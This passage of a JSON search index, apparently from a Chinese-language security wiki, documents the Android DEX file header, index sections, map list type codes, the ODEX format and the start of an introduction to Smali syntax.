; u4 stringIdsOff ; u4 typeIdsSize ; u4 typeIdsOff ; u4 protoIdsSize ; u4 protoIdsOff ; u4 fieldIdsSize ; u4 fieldIdsOff ; u4 methodIdsSize ; u4 methodIdsOff ; u4 classDefsSize ; u4 classDefsOff ; u4 dataSize ; u4 dataOff ; }; \u5176\u4e2d\u5177\u4f53\u7684\u63cf\u8ff0\u5982\u4e0b \u540d\u79f0 \u683c\u5f0f \u8bf4\u660e magic ubyte[8] = DEX_FILE_MAGIC \u6807\u8bc6DEX\u6587\u4ef6\uff0c\u5176\u4e2dDEX_FILE_MAGIC =\"dex\\n035\\0\" checksum uint \u9664 magic \u548c\u6b64\u5b57\u6bb5\u4e4b\u5916\u7684\u6587\u4ef6\u5269\u4e0b\u5185\u5bb9\u7684 adler32 \u6821\u9a8c\u548c\uff0c\u7528\u4e8e\u68c0\u6d4b\u6587\u4ef6\u635f\u574f\u60c5\u51b5 signature ubyte[20] \u9664 magic \u3001 checksum \u548c\u6b64\u5b57\u6bb5\u4e4b\u5916\u7684\u6587\u4ef6\u7684\u5185\u5bb9\u7684 SHA-1 \u7b7e\u540d\uff08\u54c8\u5e0c\uff09\uff0c\u7528\u4e8e\u5bf9\u6587\u4ef6\u8fdb\u884c\u552f\u4e00\u6807\u8bc6 file_size uint \u6574\u4e2a\u6587\u4ef6\uff08\u5305\u62ec\u6587\u4ef6\u5934\uff09\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d header_size uint = 0x70 \u6587\u4ef6\u5934\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002 endian_tag uint = ENDIAN_CONSTANT \u5b57\u8282\u5e8f\u6807\u8bb0\uff0c\u5927\u7aef\u5e8f\u6216\u8005\u5c0f\u7aef\u5e8f\u3002 link_size uint \u5982\u679c\u6b64\u6587\u4ef6\u672a\u8fdb\u884c\u9759\u6001\u94fe\u63a5\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff0c\u53cd\u4e4b\u4e3a\u94fe\u63a5\u533a\u6bb5\u7684\u5927\u5c0f\uff0c link_off uint \u5982\u679c link_size == 0 \uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\uff0c\u8be5\u504f\u79fb\u91cf\u662f\u6587\u4ef6\u5f00\u5934\u5230\u5230 link_data \u533a\u6bb5\u7684\u504f\u79fb\u91cf\u3002 map_off uint \u8be5\u504f\u79fb\u91cf\u5fc5\u987b\u975e\u96f6\uff0c\u6807\u8bc6\u4ece\u6587\u4ef6\u5f00\u5934\u5230 data \u533a\u6bb5\u7684\u504f\u79fb\u91cf\u3002 string_ids_size uint \u5b57\u7b26\u4e32\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5b57\u7b26\u4e32\u6570\u91cf string_ids_off uint \u5982\u679c string_ids_size == 0 \uff08\u4e0d\u53ef\u5426\u8ba4\u662f\u4e00\u79cd\u5947\u602a\u7684\u6781\u7aef\u60c5\u51b5\uff09\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\u8868\u793a\u4ece\u6587\u4ef6\u5f00\u5934\u5230 string_ids \u7684\u504f\u79fb\u91cf\u3002 type_ids_size uint \u7c7b\u578b\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf\uff0c\u6700\u5927\u4e3a 65535 type_ids_off uint \u5982\u679c type_ids_size == 0 \uff08\u4e0d\u53ef\u5426\u8ba4\u662f\u4e00\u79cd\u5947\u602a\u7684\u6781\u7aef\u60c5\u51b5\uff09\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\u8868\u793a\u4ece\u6587\u4ef6\u5f00\u5934\u5230 type_ids \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 proto_ids_size uint \u539f\u578b\uff08\u65b9\u6cd5\uff09\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf\uff0c\u6700\u591a\u4e3a 65535 proto_ids_off uint \u5982\u679c proto_ids_size == 0 \uff08\u4e0d\u53ef\u5426\u8ba4\u662f\u4e00\u79cd\u5947\u602a\u7684\u6781\u7aef\u60c5\u51b5\uff09\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\u8be5\u504f\u79fb\u91cf\u8868\u793a\u6587\u4ef6\u5f00\u5934\u5230 proto_ids \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 field_ids_size uint \u5b57\u6bb5\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf field_ids_off uint \u5982\u679c field_ids_size == 0 \uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\u8be5\u504f\u79fb\u91cf\u8868\u793a\u6587\u4ef6\u5f00\u5934\u5230 field_ids \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 method_ids_size uint \u65b9\u6cd5\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf method_ids_off uint \u5982\u679c method_ids_size == 0 \uff0c\u5219\u8be5\u503c\u4e3a 0 \u3002\u53cd\u4e4b\u8be5\u504f\u79fb\u91cf\u8868\u793a\u4ece\u6587\u4ef6\u5f00\u5934\u5230 method_ids \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 class_defs_size uint \u7c7b\u5b9a\u4e49\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf class_defs_off uint \u5982\u679c class_defs_size == 0 \uff08\u4e0d\u53ef\u5426\u8ba4\u662f\u4e00\u79cd\u5947\u602a\u7684\u6781\u7aef\u60c5\u51b5\uff09\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b\u53cd\u4e4b\u8be5\u504f\u79fb\u91cf\u8868\u793a\u6587\u4ef6\u5f00\u5934\u5230 class_defs \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 data_size uint data \u533a\u6bb5\u7684\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u7684\u5927\u5c0f\uff0c\u5fc5\u987b\u662f sizeof(uint) \u7684\u5076\u6570\u500d\uff0c\u8bf4\u660e8\u5b57\u8282\u5bf9\u9f50\u3002 data_off uint \u4ece\u6587\u4ef6\u5f00\u5934\u5230 data \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002","title":"DEX \u6587\u4ef6\u5934"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex_4","text":"","title":"DEX \u7d22\u5f15\u533a"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#string-id","text":"StringIds \u533a\u6bb5\u5305\u542b stringIdsSize \u4e2a DexStringId \u7ed3\u6784\uff0c\u5176\u7ed3\u6784\u5982\u4e0b\uff1a struct DexStringId { u4 stringDataOff ; /* \u5b57\u7b26\u4e32\u6570\u636e\u504f\u79fb\uff0c\u4e5f\u5c31\u662f\u6570\u636e\u533a\u4e2d\u5404\u4e2a StringData \u7684\u6587\u4ef6\u504f\u79fb*/ }; \u53ef\u4ee5\u770b\u51faDexStringId\u4e2d\u5b58\u50a8\u7684\u53ea\u662f\u6bcf\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u76f8\u5bf9\u504f\u79fb\u3002\u6b64\u5916\uff0c\u6bcf\u4e00\u4e2a\u504f\u79fb\u5360\u636e4\u4e2a\u5b57\u8282\uff0c\u5b57\u7b26\u4e32\u90e8\u5206\u4e00\u5171\u4f1a\u5360\u636e4*stringIdsSize\u4e2a\u5b57\u8282\u3002 \u5728\u5bf9\u5e94\u7684\u504f\u79fb\u5904\uff0c\u5b57\u7b26\u4e32\u662f\u4f7f\u7528MUTF-8\u683c\u5f0f\u5b58\u50a8\u7684\uff0c\u5176\u5f00\u5934\u5b58\u50a8\u4e86\u4e4b\u524d\u6211\u4eec\u6240\u8bf4\u7684LEB128\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u8868\u793a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u4e4b\u540e\u7d27\u8ddf\u7740\u7684\u5c31\u662f\u5b57\u7b26\u4e32\uff0c\u4e4b\u540e\u4ee5\\x00\u7ed3\u5c3e\uff0c\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u4e0d\u5305\u542b\\x00\u3002","title":"string id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#type-id","text":"type_ids \u533a\u7d22\u5f15\u4e86java\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u7c7b\u578b\uff08\u7c7b\u3001\u6570\u7ec4\u6216\u57fa\u672c\u7c7b\u578b\uff09\uff0c\u6b64\u5217\u8868\u5fc5\u987b\u6309 string_id \u7d22\u5f15\u8fdb\u884c\u6392\u5e8f\uff0c\u5e76\u4e14\u4e0d\u80fd\u91cd\u590d\u3002 struct DexTypeId { u4 descriptorIdx ; /* \u6307\u5411 DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ };","title":"type id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#proto-id","text":"Proto id\u5b57\u6bb5\u4e3b\u8981\u662f\u9488\u5bf9\u4e8e java \u4e2d\u7684\u65b9\u6cd5\u539f\u578b\u800c\u8bbe\u8ba1\u7684\uff0c\u8fd9\u91cc\u9762\u4e3b\u8981\u5305\u542b\u4e86\u4e00\u4e2a\u65b9\u6cd5\u58f0\u660e\u7684\u8fd4\u56de\u7c7b\u578b\u4e0e\u53c2\u6570\u5217\u8868\uff0c\u5bf9\u4e8e\u65b9\u6cd5\u540d\u5c1a\u672a\u6d89\u53ca\u3002\u5176\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u4e09\u4e2a\u6570\u636e\u7ed3\u6784 struct DexProtoId { u4 shortyIdx ; /* \u8fd4\u56de\u7c7b\u578b+\u53c2\u6570\u7c7b\u578b\uff0c\u7b80\u5199\uff0c\u6307\u5411DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ u4 returnTypeIdx ; /* \u8fd4\u56de\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u4 parametersOff ; /* \u53c2\u6570\u7c7b\u578b\uff0c\u6307\u5411DexTypeList\u7684\u504f\u79fb */ } struct DexTypeList { u4 size ; /* DexTypeItem\u7684\u4e2a\u6570\uff0c\u5373\u53c2\u6570\u4e2a\u6570 */ DexTypeItem list [ 1 ]; /* \u6307\u5411DexTypeItem\u5f00\u59cb\u5904 */ }; struct DexTypeItem { u2 typeIdx ; /* \u53c2\u6570\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15\uff0c\u6700\u7ec8\u6307\u5411\u5b57\u7b26\u4e32\u7d22\u5f15 */ };","title":"proto Id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#field-id","text":"field id\u533a\u4e3b\u8981\u662f\u9488\u5bf9\u4e8ejava\u4e2d\u6bcf\u4e2a\u7c7b\u7684\u5b57\u6bb5\u800c\u8bbe\u8ba1\u7684\uff0c\u4e3b\u8981\u6d89\u53ca\u5230\u4ee5\u4e0b\u6570\u636e\u7ed3\u6784 struct DexFieldId { u2 classIdx ; /* \u7c7b\u7684\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u2 typeIdx ; /* \u5b57\u6bb5\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u4 nameIdx ; /* \u5b57\u6bb5\u540d\uff0c\u6307\u5411DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ };","title":"field id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#method-id","text":"method id\u533a\u662f\u76f4\u63a5\u4e3a java \u4e2d\u7684\u65b9\u6cd5\u800c\u8bbe\u8ba1\u7684\uff0c\u5176\u5305\u542b\u4e86\u65b9\u6cd5\u6240\u5728\u7684\u7c7b\uff0c\u65b9\u6cd5\u7684\u539f\u578b\uff0c\u65b9\u6cd5\u7684\u540d\u5b57\u3002 struct DexMethodId { u2 classIdx ; /* \u7c7b\u7684\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u2 protoIdx ; /* \u58f0\u660e\u7c7b\u578b\uff0c\u6307\u5411DexProtoId\u5217\u8868\u7684\u7d22\u5f15 */ u4 nameIdx ; /* \u65b9\u6cd5\u540d\uff0c \u6307\u5411DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ };","title":"method id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#class-def","text":"classDefsSize\u8868\u660e class def \u533a\u57df\u7684\u5927\u5c0f\uff0cclassDefsOff\u8868\u660eclass def \u533a\u7684\u504f\u79fb\u3002 \u8be5\u533a\u662f\u4e3a java \u4e2d\u7684\u7c7b\u800c\u8bbe\u8ba1\u7684\uff0c\u5305\u542b\u4ee5\u4e0b\u7684\u6570\u636e\u7ed3\u6784\uff0c\u76f8\u5173\u4fe1\u606f\u5982\u4e0b // \u7c7b\u7684\u57fa\u672c\u4fe1\u606f struct DexClassDef { u4 classIdx ; /* \u7c7b\u7684\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u4 accessFlags ; /* \u8bbf\u95ee\u6807\u5fd7 */ u4 superclassIdx ; /* \u7236\u7c7b\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u4 interfacesOff ; /* \u63a5\u53e3\uff0c\u6307\u5411DexTypeList\u7684\u504f\u79fb */ u4 sourceFileIdx ; /* \u6e90\u6587\u4ef6\u540d\uff0c\u6307\u5411DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ u4 annotationsOff ; /* \u6ce8\u89e3\uff0c\u6307\u5411DexAnnotationsDirectoryItem\u7ed3\u6784 */ u4 classDataOff ; /* \u6307\u5411DexClassData\u7ed3\u6784\u7684\u504f\u79fb */ u4 staticValuesOff ; /* \u6307\u5411DexEncodedArray\u7ed3\u6784\u7684\u504f\u79fb */ }; // \u7c7b\u7684\u5b57\u6bb5\u4e0e\u65b9\u6cd5\u6982\u51b5 struct DexClassData { DexClassDataHeader header ; /* \u6307\u5b9a\u5b57\u6bb5\u4e0e\u65b9\u6cd5\u7684\u4e2a\u6570 */ DexField * staticFields ; /* \u9759\u6001\u5b57\u6bb5\uff0cDexField\u7ed3\u6784 */ DexField * instanceFields ; /* \u5b9e\u4f8b\u5b57\u6bb5\uff0cDexField\u7ed3\u6784 */ DexMethod * directMethods ; /* \u76f4\u63a5\u65b9\u6cd5\uff0cDexMethod\u7ed3\u6784 */ DexMethod * virtualMethods ; /* \u865a\u65b9\u6cd5\uff0cDexMethod\u7ed3\u6784 */ // \u8be6\u7ec6\u63cf\u8ff0\u7c7b\u7684\u5b57\u6bb5\u4e2a\u6570\u4e0e\u65b9\u6cd5\u4e2a\u6570 struct DexClassDataHeader { u4 staticFieldsSize ; /* \u9759\u6001\u5b57\u6bb5\u4e2a\u6570 */ u4 instanceFieldsSize ; /* \u5b9e\u4f8b\u5b57\u6bb5\u4e2a\u6570 */ u4 directMethodsSize ; /* \u76f4\u63a5\u65b9\u6cd5\u4e2a\u6570 */ u4 virtualMethodsSize ; /* \u865a\u65b9\u6cd5\u4e2a\u6570 */ }; // \u5b57\u6bb5\u5b9a\u4e49 struct DexField { u4 fieldIdx ; /* \u6307\u5411DexFieldId\u7684\u7d22\u5f15 */ u4 accessFlags ; /* \u8bbf\u95ee\u6807\u5fd7 */ }; // \u65b9\u6cd5\u5b9a\u4e49 struct DexMethod { u4 methodIdx ; /* \u6307\u5411DexMethodId\u7684\u7d22\u5f15 */ u4 accessFlags ; /* \u8bbf\u95ee\u6807\u5fd7 */ u4 codeOff ; /* \u6307\u5411DexCode\u7ed3\u6784\u7684\u504f\u79fb */ }; // \u4ee3\u7801\u6982\u51b5 struct DexCode { u2 registersSize ; /* \u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u4e2a\u6570 */ u2 insSize ; /* \u53c2\u6570\u4e2a\u6570 */ u2 outsSize ; /* \u8c03\u7528\u5176\u4ed6\u65b9\u6cd5\u65f6\u5176\u5b83\u65b9\u6cd5\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u4e2a\u6570\uff0c\u4f1a\u5728\u81ea\u5df1\u7684\u8c03\u7528\u6808\u7533\u8bf7\uff0c\u5e76\u538b\u6808\uff08\u731c\u6d4b\uff09 */ u2 triesSize ; /* Try/Catch\u4e2a\u6570 */ u4 debugInfoOff ; /* \u6307\u5411\u8c03\u8bd5\u4fe1\u606f\u7684\u504f\u79fb */ u4 insnsSize ; /* \u6307\u4ee4\u96c6\u4e2a\u6570\uff0c\u4ee52\u5b57\u8282\u4e3a\u5355\u4f4d */ u2 insns [ 1 ]; /* \u6307\u4ee4\u96c6 */ };","title":"class def"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#_3","text":"\u53ef\u4ee5\u770b\u51fa\u5728\u7d22\u5f15\u533a\u6307\u5411\u662f\u6bd4\u8f83\u590d\u6742\u7684\uff0c\u4f46\u540c\u65f6\u4e5f\u6bd4\u8f83\u5de7\u5999\uff0c\u8fd9\u91cc\u7ed9\u51faDalvik\u8bbe\u8ba1\u8005\u5728 Google Developer Day 2008 China \u6f14\u8bb2\u4e2d\u7ed9\u51fa\u7684\u4f8b\u5b50\u3002","title":"\u5c0f\u7ed3"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex_5","text":"\u8fd9\u91cc\u5b58\u7684\u5c31\u662f\u4e4b\u524d\u6240\u8bf4\u7684\u5404\u79cd\u6570\u636e\u4e86\u3002","title":"DEX \u6570\u636e\u533a"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-map-section","text":"DexHeader\u4e2d\u7684mapOff\u5b57\u6bb5\u7ed9\u51fa\u4e86DexMapList\u7ed3\u6784\u5728DEX\u6587\u4ef6\u4e2d\u7684\u504f\u79fb\u3002\u5f53Dalvik\u865a\u62df\u673a\u89e3\u6790DEX\u6587\u4ef6\u540e\u7684\u5185\u5bb9\u540e\uff0c\u4f1a\u5c06\u5185\u5bb9\u6620\u5c04\u5230DexMapList\u6570\u636e\u7ed3\u6784\uff0c\u53ef\u4ee5\u8bf4\u8be5\u7ed3\u6784\u63cf\u8ff0\u4e86\u5bf9\u5e94\u7684DEX\u6587\u4ef6\u7684\u6574\u4f53\u6982\u51b5\u3002\u5176\u5177\u4f53\u4ee3\u7801\u5982\u4e0b struct DexMapList { u4 size ; /* DexMapItem\u7684\u4e2a\u6570\uff0c\u65b9\u4fbf\u89e3\u6790 */ DexMapItem list [ 1 ]; /* \u6307\u5411DexMapItem */ }; struct DexMapItem { u2 type ; /* kDexType\u5f00\u5934\u7684\u7c7b\u578b */ u2 unused ; /* \u672a\u4f7f\u7528\uff0c\u7528\u4e8e\u5b57\u8282\u5bf9\u9f50 */ u4 size ; /* \u6307\u5b9a\u76f8\u5e94\u7c7b\u578b\u7684\u4e2a\u6570 */ u4 offset ; /* \u6307\u5b9a\u76f8\u5e94\u7c7b\u578b\u7684\u6570\u636e\u7684\u6587\u4ef6\u504f\u79fb */ }; /* type\u5b57\u6bb5\u4e3a\u4e00\u4e2a\u679a\u4e3e\u5e38\u91cf\uff0c\u901a\u8fc7\u7c7b\u578b\u540d\u79f0\u5f88\u5bb9\u6613\u5224\u65ad\u5b83\u7684\u5177\u4f53\u7c7b\u578b\u3002 */ /* map item type codes */ enum { kDexTypeHeaderItem = 0x0000 , kDexTypeStringIdItem = 0x0001 , kDexTypeTypeIdItem = 0x0002 , kDexTypeProtoIdItem = 0x0003 , kDexTypeFieldIdItem = 0x0004 , kDexTypeMethodIdItem = 0x0005 , kDexTypeClassDefItem = 0x0006 , kDexTypeMapList = 0x1000 , kDexTypeTypeList = 0x1001 , kDexTypeAnnotationSetRefList = 0x1002 , kDexTypeAnnotationSetItem = 0x1003 , kDexTypeClassDataItem = 0x2000 , kDexTypeCodeItem = 0x2001 , kDexTypeStringDataItem = 0x2002 , kDexTypeDebugInfoItem = 0x2003 , kDexTypeAnnotationItem = 0x2004 , kDexTypeEncodedArrayItem = 0x2005 , kDexTypeAnnotationsDirectoryItem = 0x2006 , };","title":"DEX map section"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex_6","text":"\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u5df1\u627e\u4e00\u4e2a apk\uff0c\u7136\u540e\u62ff 010editor \u7684\u6a21\u677f\u89e3\u6790\u4e00\u4e0b\u5c31\u53ef\u4ee5\u770b\u5230\u76f8\u5e94\u7684\u7ed3\u679c\u4e86\u3002","title":"DEX\u5b9e\u4f8b"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#_4","text":"Android \u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/","text":"ODEX\u6587\u4ef6 \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 \u6211\u4eec\u77e5\u9053 Android \u5e94\u7528\u7a0b\u5e8f\u7684 java \u5c42\u7684\u4ee3\u7801\u5728 apk \u6587\u4ef6\u7684 class.dex \u6587\u4ef6\u4e2d\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5728\u6bcf\u6b21\u542f\u52a8\u7a0b\u5e8f\u65f6\u4f1a\u4ece\u4e2d\u83b7\u53d6\u5230 dex \u6587\u4ef6\u5e76\u8fdb\u884c\u89e3\u6790\uff0c\u663e\u7136\u6bcf\u6b21\u90fd\u8fd9\u6837\u505a\uff0c\u6548\u7387\u4f1a\u6bd4\u8f83\u4f4e\u4e0b\u3002Android \u5f00\u53d1\u8005\u63d0\u51fa\u4e86\u4e00\u79cd\u65b9\u5f0f\uff0c\u5373\u6211\u4eec\u6700\u521d\u52a0\u8f7d dex \u6587\u4ef6\u65f6\uff0c\u5c31\u5bf9\u5176\u8fdb\u884c\u4f18\u5316\uff0c\u751f\u6210\u4e00\u4e2a ODEX \u6587\u4ef6\uff0c\u5b58\u653e\u5728 /data/dalvik-cache \u76ee\u5f55\u4e0b\u3002\u5f53\u4ee5\u540e\u518d\u6b21\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\uff0c\u6211\u4eec\u53ea\u9700\u8981\u76f4\u63a5\u52a0\u8f7d\u8fd9\u4e2a\u4f18\u5316\u8fc7\u7684 ODEX \u6587\u4ef6\u5c31\u884c\u4e86\uff0c\u7701\u53bb\u4e86\u6bcf\u6b21\u90fd\u8981\u4f18\u5316\u7684\u65f6\u95f4\u3002\u5bf9\u4e8e Android ROM \u4e2d\u7cfb\u7edf\u81ea\u5e26\u7684 app \uff0c\u76f4\u63a5\u8f6c\u6362\u4e3a odex \u6587\u4ef6\uff0c\u5b58\u653e\u5728\u4e0e apk \u76f8\u540c\u7684\u76ee\u5f55\u4e0b\uff0c\u8fd9\u6837\uff0c\u5f53\u624b\u673a\u6bcf\u6b21\u5f00\u673a\u542f\u52a8\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u5feb\u5f88\u591a\u4e86\u3002 \u57fa\u672c\u7ed3\u6784 \u00b6 \u5f85\u8865\u5145\u3002 \u751f\u6210\u8fc7\u7a0b \u00b6 \u5f85\u8865\u5145\u3002 \u53c2\u8003\u9605\u8bfb \u00b6 Android \u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790","title":"ODEX"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#odex","text":"","title":"ODEX\u6587\u4ef6"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#_1","text":"\u6211\u4eec\u77e5\u9053 Android \u5e94\u7528\u7a0b\u5e8f\u7684 java \u5c42\u7684\u4ee3\u7801\u5728 apk \u6587\u4ef6\u7684 class.dex \u6587\u4ef6\u4e2d\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5728\u6bcf\u6b21\u542f\u52a8\u7a0b\u5e8f\u65f6\u4f1a\u4ece\u4e2d\u83b7\u53d6\u5230 dex \u6587\u4ef6\u5e76\u8fdb\u884c\u89e3\u6790\uff0c\u663e\u7136\u6bcf\u6b21\u90fd\u8fd9\u6837\u505a\uff0c\u6548\u7387\u4f1a\u6bd4\u8f83\u4f4e\u4e0b\u3002Android \u5f00\u53d1\u8005\u63d0\u51fa\u4e86\u4e00\u79cd\u65b9\u5f0f\uff0c\u5373\u6211\u4eec\u6700\u521d\u52a0\u8f7d dex \u6587\u4ef6\u65f6\uff0c\u5c31\u5bf9\u5176\u8fdb\u884c\u4f18\u5316\uff0c\u751f\u6210\u4e00\u4e2a ODEX \u6587\u4ef6\uff0c\u5b58\u653e\u5728 /data/dalvik-cache \u76ee\u5f55\u4e0b\u3002\u5f53\u4ee5\u540e\u518d\u6b21\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\uff0c\u6211\u4eec\u53ea\u9700\u8981\u76f4\u63a5\u52a0\u8f7d\u8fd9\u4e2a\u4f18\u5316\u8fc7\u7684 ODEX \u6587\u4ef6\u5c31\u884c\u4e86\uff0c\u7701\u53bb\u4e86\u6bcf\u6b21\u90fd\u8981\u4f18\u5316\u7684\u65f6\u95f4\u3002\u5bf9\u4e8e Android ROM \u4e2d\u7cfb\u7edf\u81ea\u5e26\u7684 app \uff0c\u76f4\u63a5\u8f6c\u6362\u4e3a odex \u6587\u4ef6\uff0c\u5b58\u653e\u5728\u4e0e apk \u76f8\u540c\u7684\u76ee\u5f55\u4e0b\uff0c\u8fd9\u6837\uff0c\u5f53\u624b\u673a\u6bcf\u6b21\u5f00\u673a\u542f\u52a8\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u5feb\u5f88\u591a\u4e86\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#_2","text":"\u5f85\u8865\u5145\u3002","title":"\u57fa\u672c\u7ed3\u6784"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#_3","text":"\u5f85\u8865\u5145\u3002","title":"\u751f\u6210\u8fc7\u7a0b"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#_4","text":"Android \u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/","text":"Smali \u00b6 \u4ecb\u7ecd \u00b6 \u5728\u6267\u884c Android Java \u5c42\u7684\u4ee3\u7801\u65f6\uff0c\u5176\u5b9e\u5c31\u662f Dalvik(ART) \u865a\u62df\u673a\uff08\u4f7f\u7528 C\u6216 C++ \u4ee3\u7801\u5b9e\u73b0\uff09\u5728\u89e3\u6790 Dalvik \u5b57\u8282\u7801\uff0c\u4ece\u800c\u6a21\u62df\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u3002 \u81ea\u7136\uff0cDalvik \u5b57\u8282\u7801\u6666\u6da9\u96be\u61c2\uff0c\u7814\u7a76\u4eba\u5458\u4eec\u7ed9\u51fa\u4e86 Dalvik \u5b57\u8282\u7801\u7684\u4e00\u79cd\u52a9\u8bb0\u65b9\u5f0f\uff1asmali \u8bed\u6cd5\u3002\u901a\u8fc7\u4e00\u4e9b\u5de5\u5177\uff08\u5982 apktool\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u5df2\u6709\u7684 dex \u6587\u4ef6\u8f6c\u5316\u4e3a\u82e5\u5e72\u4e2a smali \u6587\u4ef6\uff08 \u4e00\u822c\u800c\u8a00\uff0c\u4e00\u4e2a smali \u6587\u4ef6\u5bf9\u5e94\u7740\u4e00\u4e2a\u7c7b \uff09\uff0c\u7136\u540e\u8fdb\u884c\u9605\u8bfb\u3002\u5bf9\u4e8e\u4e0d\u540c\u7684\u5de5\u5177\u6765\u8bf4\uff0c\u5176\u8f6c\u6362\u540e\u7684 smali \u4ee3\u7801\u4e00\u822c\u90fd\u4e0d\u4e00\u6837\uff0c\u6bd5\u7adf\u8fd9\u4e2a\u8bed\u6cd5\u4e0d\u662f\u5b98\u65b9\u7684\u6807\u51c6\u3002\u8fd9\u91cc\u6211\u4eec\u4ecb\u7ecd\u6bd4\u8f83\u901a\u7528\u7684\u8bed\u6cd5\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728smali \u8bed\u6cd5\u4e2d\uff0c\u4f7f\u7528\u7684\u90fd\u662f\u5bc4\u5b58\u5668\uff0c\u4f46\u662f\u5176\u5728\u89e3\u91ca\u6267\u884c\u7684\u65f6\u5019\uff0c\u5f88\u591a\u90fd\u4f1a\u6620\u5c04\u5230\u6808\u4e2d\u3002 \u611f\u89c9\u4f3c\u4e4e\u8fd9\u91cc\u7ed9\u4e2a\u4f8b\u5b50\u6bd4\u8f83\u5408\u9002\uff01\uff01\uff01\uff01\uff01 \u57fa\u672c\u7ed3\u6784 \u00b6 \u4e00\u4e2a Smali \u6587\u4ef6\u7684\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u57fa\u672c\u7c7b\u4fe1\u606f \u524d\u4e09\u884c\u63cf\u8ff0\u8f6c\u6362\u4e3a\u8be5 Smali \u6587\u4ef6\u7684\u7c7b\u7684\u4fe1\u606f 